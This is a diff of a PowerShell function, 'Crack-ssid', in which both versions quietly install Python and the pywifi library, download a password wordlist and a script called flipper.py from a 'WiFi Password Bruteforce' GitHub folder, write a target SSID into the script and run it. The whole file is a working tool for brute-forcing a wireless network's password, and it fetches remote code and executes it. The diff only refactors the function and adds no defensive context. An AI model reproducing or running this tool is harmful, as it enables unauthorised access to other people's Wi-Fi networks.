@@ -1,49 +1,26 @@
 function Crack-ssid {
     param (
+        [Parameter(Mandatory = $true)]
         [string]$ssid
     )
 
-    # Function to download a file using WebClient
-    function Download-File {
-        param (
-            [string]$url,
-            [string]$outputPath
-        )
+    # Step 1: Download Python and pip
+    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.9.7/python-3.9.7-amd64.exe" -OutFile "$env:TEMP\python-3.9.7-amd64.exe"
+    Start-Process -FilePath "$env:TEMP\python-3.9.7-amd64.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
 
-        $webClient = New-Object System.Net.WebClient
-        $webClient.DownloadFile($url, $outputPath)
-    }
+    # Step 2: Install required Python packages
+    pip install comtypes pywifi
 
-    # Download Python installer
-    $pythonInstallerUrl = "https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe"
-    $pythonInstallerPath = "$env:TEMP\python_installer.exe"
-    Download-File -url $pythonInstallerUrl -outputPath $pythonInstallerPath
+    # Step 3: Download pass.txt file
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/calinux-py/Python/main/WiFi%20Password%20Bruteforce/pass.txt" -OutFile "$env:TEMP\pass.txt"
 
-    # Install Python
-    Start-Process -Wait -FilePath $pythonInstallerPath -ArgumentList "/quiet", "PrependPath=1"
+    # Step 4: Download flipper.py file and amend the ssid
+    $pythonScriptPath = "$env:TEMP\flipper.py"
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/calinux-py/Python/main/WiFi%20Password%20Bruteforce/flipper.py" -OutFile $pythonScriptPath
+    (Get-Content -Path $pythonScriptPath) | ForEach-Object {$_ -replace "YOUR_SSID_HERE", "$ssid"} | Set-Content -Path $pythonScriptPath
 
-    # Install pip
-    python -m ensurepip
-
-    
-    pip install comtypes
-    pip install pywifi
-
-    # Download pass.txt from the URL and save it to the user's temp directory
-    $passUrl = 'https://raw.githubusercontent.com/calinux-py/Python/main/WiFi%20Password%20Bruteforce/pass.txt'
-    $passFilePath = "$env:TEMP\pass.txt"
-    Invoke-WebRequest -Uri $passUrl -OutFile $passFilePath -UseBasicParsing
-
-    # Download flipper.py from the URL and save it to the user's temp directory
-    $flipperUrl = 'https://raw.githubusercontent.com/calinux-py/Python/main/WiFi%20Password%20Bruteforce/flipper.py'
-    $flipperFilePath = "$env:TEMP\flipper.py"
-    Invoke-WebRequest -Uri $flipperUrl -OutFile $flipperFilePath -UseBasicParsing
-
-    # Replace "YOUR_SSID_HERE" with the provided SSID
-    (Get-Content $flipperFilePath) -replace 'YOUR_SSID_HERE', $ssid | Set-Content $flipperFilePath
-
-    # Run the Python script with the updated SSID
-    python $flipperFilePath
+    # Step 5: Run the python script
+    python $pythonScriptPath
 }
 
-# Crack-ssid -ssid "YOUR_SSID_HERE"
+# Crack-ssid -ssid "YOUR SSID"
